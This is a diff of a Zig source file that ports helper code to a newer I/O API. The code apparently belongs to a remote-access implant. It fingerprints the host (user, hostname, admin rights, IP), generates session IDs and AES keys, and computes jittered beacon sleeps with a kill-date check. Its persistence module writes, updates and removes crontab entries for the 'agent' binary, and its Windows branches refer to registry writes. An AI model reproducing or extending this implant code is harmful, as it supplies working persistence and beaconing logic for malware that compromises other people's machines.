@@ -1,6 +1,7 @@
 const std = @import("std");
 const builtin = @import("builtin");
 const crypto = std.crypto;
+const Io = std.Io;
 const base64 = std.base64;
 const time = std.time;
 const Allocator = std.mem.Allocator;
@@ -8,32 +9,34 @@ extern "shell32" fn IsUserAnAdmin() callconv(.winapi) bool;
 
 pub const SystemInfo = struct {
     allocator: Allocator,
+    io: Io,
+    environ_map: *std.process.Environ.Map,
 
-    pub fn init(allocator: Allocator) SystemInfo {
+    pub fn init(allocator: Allocator, io: Io, environ_map: *std.process.Environ.Map) SystemInfo {
         return SystemInfo{
             .allocator = allocator,
+            .io = io,
+            .environ_map = environ_map,
         };
     }
 
     pub fn getCurrentUser(self: *SystemInfo) ![]const u8 {
         const key = if (builtin.os.tag == .windows) "USERNAME" else "USER";
-        // Using getEnvVarOwned since the windows API is killing me
-        return std.process.getEnvVarOwned(self.allocator, key) catch |err| {
-            if (err == error.EnvironmentVariableNotFound) {
-                return self.allocator.dupe(u8, "unknown");
-            }
-            return err;
-        };
+        // getEnvVarOwned is deprecated, so we have to use Environ.Map. Feels a lot more cumbersome but it is what it is.
+        if (self.environ_map.get(key)) |value| {
+            return self.allocator.dupe(u8, value);
+        } else {
+            return self.allocator.dupe(u8, "Unknown");
+        }
     }
 
     pub fn getHostname(self: *SystemInfo) ![]const u8 {
         if (builtin.os.tag == .windows) {
-            return std.process.getEnvVarOwned(self.allocator, "COMPUTERNAME") catch |err| {
-                if (err == error.EnvironmentVariableNotFound) {
-                    return self.allocator.dupe(u8, "Unknown");
-                }
-                return err;
-            };
+            if (self.environ_map.get("COMPUTERNAME")) |value| {
+                return self.allocator.dupe(u8, value);
+            } else {
+                return self.allocator.dupe(u8, "Unknown");
+            }
         } else {
             var hostname_buf: [64]u8 = undefined;
             const result = std.posix.gethostname(&hostname_buf) catch "Unknown";
@@ -115,8 +118,7 @@ pub const SystemInfo = struct {
             return try self.allocator.dupe(u8, first_ip);
         } else {
             //we are going to run hostname -I and return the first IP address. I don't wanna use c library for this.
-            const result = std.process.Child.run(.{
-                .allocator = self.allocator,
+            const result = std.process.run(self.allocator, self.io, .{
                 .argv = &.{ "hostname", "-I" },
             }) catch |err| {
                 std.debug.print("{}\n", .{err}); //I should fix this later
@@ -145,45 +147,46 @@ pub const CryptoUtils = struct {
         };
     }
 
-    pub fn generateSessionId(self: *CryptoUtils) ![]const u8 {
+    pub fn generateSessionId(self: *CryptoUtils, io: Io) ![]const u8 {
         var session_bytes: [8]u8 = undefined;
-        crypto.random.bytes(&session_bytes);
+        Io.random(io, &session_bytes);
         return try std.fmt.allocPrint(self.allocator, "{x}", .{std.mem.readInt(u64, &session_bytes, .big)});
     }
 
-    pub fn generateAESKey() [32]u8 {
+    pub fn generateAESKey(io: Io) [32]u8 {
         var aes_key: [32]u8 = undefined;
-        crypto.random.bytes(&aes_key);
+        Io.random(io, &aes_key);
         return aes_key;
     }
 };
 
 pub const TimeUtils = struct {
-    pub fn sleep(sleep_time: u64) void {
-        std.Thread.sleep(sleep_time * time.ns_per_s);
+    pub fn sleep(io: Io, sleep_time: u64) !void {
+        try Io.sleep(io, Io.Duration.fromNanoseconds(sleep_time * time.ns_per_s), .real);
     }
 
-    pub fn calculateJitteredSleep(base_sleep: u32, jitter: f32) u64 {
+    pub fn calculateJitteredSleep(base_sleep: u32, jitter: f32, io: Io) u64 {
         const jitter_amount = @as(u64, @intFromFloat(@as(f64, @floatFromInt(base_sleep)) * jitter));
 
-        var prng = std.Random.DefaultPrng.init(@intCast(time.timestamp()));
+        const ts = Io.Timestamp.now(io, .real);
+        var prng = std.Random.DefaultPrng.init(@intCast(ts.toNanoseconds()));
         const random_jitter = prng.random().intRangeAtMost(u64, 0, jitter_amount);
 
         return base_sleep + random_jitter - (jitter_amount / 2);
     }
 
-    pub fn getCurrentTimestamp() i64 {
-        return time.timestamp();
+    pub fn getCurrentTimestamp(io: Io) Io.Timestamp {
+        return Io.Timestamp.now(io, .real);
     }
 
-    pub fn isKillDateReached(kill_date: []const u8) bool {
+    pub fn isKillDateReached(kill_date: []const u8, io: Io) bool {
         // Would implement date parsing and comparison
         // Should ideally take kill date from config
         // convert to epoch time, and compare to current time
         const parsed_date = parseDate(kill_date) catch {
             return false;
         };
-        const current_timestamp = time.timestamp();
+        const current_timestamp = Io.Timestamp.now(io, .real).toNanoseconds();
         return current_timestamp >= parsed_date;
     }
 
@@ -242,7 +245,7 @@ pub const TimeUtils = struct {
 };
 
 pub const PersistUtils = struct {
-    pub fn install_cron(agent_path: []const u8, allocator: std.mem.Allocator) !void {
+    pub fn install_cron(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
             const existing = try std.process.Child.run(.{
                 .allocator = allocator,
@@ -288,10 +291,10 @@ pub const PersistUtils = struct {
                 return error.RegistryWriteFailed;
             }
         } else {
-            const existing = std.process.Child.run(.{
-                .allocator = allocator,
+            const existing = std.process.run(allocator, io, .{
                 .argv = &.{ "crontab", "-l" },
-                .max_output_bytes = 8192,
+                .stdout_limit = .limited(8192),
+                .stderr_limit = .limited(8192),
             }) catch |err| {
                 // proceed with empty if none exists(crontab)
                 if (err == error.ChildExecFailed) {
@@ -308,13 +311,11 @@ pub const PersistUtils = struct {
             const combined = try std.mem.concat(allocator, u8, &[_][]const u8{ existing.stdout, cron_line });
             defer allocator.free(combined);
 
-            var write_proc = std.process.Child.init(&[_][]const u8{ "crontab", "-" }, allocator);
-            write_proc.stdin_behavior = .Pipe;
-            try write_proc.spawn();
+            const write_proc = try std.process.spawn(io, .{.argv = &[_][]const u8{ "crontab", "-" }, .stdin = .pipe, .stdout = .inherit, .stderr = .inherit,});
 
             if (write_proc.stdin) |stdin| {
-                try stdin.writeAll(combined);
-                stdin.close();
+                try stdin.writeStreamingAll(io, combined);
+                stdin.close(io);
             }
 
             // _ = write_proc.wait() catch |err| {
@@ -323,7 +324,7 @@ pub const PersistUtils = struct {
             //};
         }
     }
-    pub fn remove_cron_entry(agent_path: []const u8, allocator: std.mem.Allocator) !void {
+    pub fn remove_cron_entry(agent_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
         if (builtin.os.tag == .windows) {
             const existing = try std.process.Child.run(.{
                 .allocator = allocator,
@@ -333,15 +334,15 @@ pub const PersistUtils = struct {
                 return error.RegistryDeleteFailed;
             }
         } else {
-            const existing = std.process.Child.run(.{
-                .allocator = allocator,
+            const existing = std.process.run( allocator, io, .{
                 .argv = &.{ "crontab", "-l" },
-                .max_output_bytes = 8192,
+                .stdout_limit = .limited(8192),
+                .stderr_limit = .limited(8192),
             }) catch |err| {
                 if (err == error.ChildExecFailed) return; // nothing to remove no crontab
                 return err;
             };
-            var list = std.ArrayList([]const u8){};
+            var list = std.ArrayList([]const u8).empty;
             defer list.deinit(allocator);
 
             // Split into lines and filter out any containing our agent path
@@ -354,19 +355,17 @@ pub const PersistUtils = struct {
             const filtered = try std.mem.join(allocator, "\n", list.items);
             defer allocator.free(filtered);
 
-            var write_proc = std.process.Child.init(&[_][]const u8{ "crontab", "-" }, allocator);
-            write_proc.stdin_behavior = .Pipe;
-            try write_proc.spawn();
+            const write_proc = try std.process.spawn(io, .{.argv = &[_][]const u8{ "crontab", "-" }, .stdin = .pipe, .stdout = .inherit, .stderr = .inherit,});
 
             if (write_proc.stdin) |stdin| {
-                try stdin.writeAll(filtered);
-                try stdin.writeAll("\n");
-                stdin.close();
+                try stdin.writeStreamingAll(io, filtered);
+                try stdin.writeStreamingAll(io, "\n");
+                stdin.close(io);
             }
         }
         //_ = write_proc.wait() catch {};//line caused a panic in my tests, commenting out for now
     }
-    pub fn get_cron_entries(allocator: std.mem.Allocator) !?[]const u8 {
+    pub fn get_cron_entries(allocator: std.mem.Allocator, io: Io) !?[]const u8 {
         if (builtin.os.tag == .windows) {
             const result = try std.process.Child.run(.{
                 .allocator = allocator,
@@ -384,10 +383,10 @@ pub const PersistUtils = struct {
             }
             return try allocator.dupe(u8, result.stdout);
         } else {
-            const result = try std.process.Child.run(.{
-                .allocator = allocator,
+            const result = try std.process.run(allocator, io, .{
                 .argv = &.{ "crontab", "-l" },
-                .max_output_bytes = 8192,
+                .stdout_limit = .limited(8192),
+                .stderr_limit = .limited(8192),
             });
             const out = result.stdout;
             var filtered_lines = std.mem.tokenizeAny(u8, out, "\n");
@@ -404,8 +403,8 @@ pub const PersistUtils = struct {
             return null; // No entry found
         }
     }
-    pub fn update_cron_entry(old_path: []const u8, new_path: []const u8, allocator: std.mem.Allocator) !void {
-        try PersistUtils.remove_cron_entry(old_path, allocator);
-        try PersistUtils.install_cron(new_path, allocator);
+    pub fn update_cron_entry(old_path: []const u8, new_path: []const u8, allocator: std.mem.Allocator, io: Io) !void {
+        try PersistUtils.remove_cron_entry(old_path, allocator, io);
+        try PersistUtils.install_cron(new_path, allocator, io);
     }
 };
